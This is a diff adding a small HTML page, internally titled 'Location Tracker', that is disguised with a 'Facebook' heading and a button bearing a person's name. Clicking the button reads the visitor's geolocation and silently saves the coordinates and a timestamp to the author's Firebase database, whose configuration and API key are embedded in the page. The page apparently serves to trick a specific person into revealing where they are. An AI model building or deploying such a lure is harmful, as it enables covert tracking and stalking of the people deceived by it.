@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Tracker</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+  <h1>Facebook</h1>
+  <button onclick="shareLocation()">Abdul</button>
+
+  <script>
+    var firebaseConfig = {
+      apiKey: "AIzaSyAkqU67XgiESjgUlGu7A3HjTYV7zTfzZtA",
+      authDomain: "location-tracke-dece3.firebaseapp.com",
+      projectId: "location-tracke-dece3",
+      storageBucket: "location-tracke-dece3.appspot.com",
+      messagingSenderId: "871701922750",
+      appId: "1:871701922750:web:2d83b97c34997ac7a9efef",
+      measurementId: "G-VGJ0SRJ41H",
+      databaseURL: "https://location-tracke-dece3-default-rtdb.firebaseio.com"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    var database = firebase.database();
+
+    function shareLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          var lat = position.coords.latitude;
+          var lon = position.coords.longitude;
+
+          database.ref("users/sharedLocation").set({
+            latitude: lat,
+            longitude: lon,
+            timestamp: new Date().toISOString()
+          }).then(function() {
+            alert("Location shared successfully!");
+          }).catch(function(error) {
+            console.error("Error saving location:", error);
+          });
+        }, function(error) {
+          console.error("Error getting location:", error);
+          alert("Permission denied or error occurred.");
+        });
+      } else {
+        alert("Geolocation is not supported.");
+      }
+    }
+  </script>
+</body>
+</html>
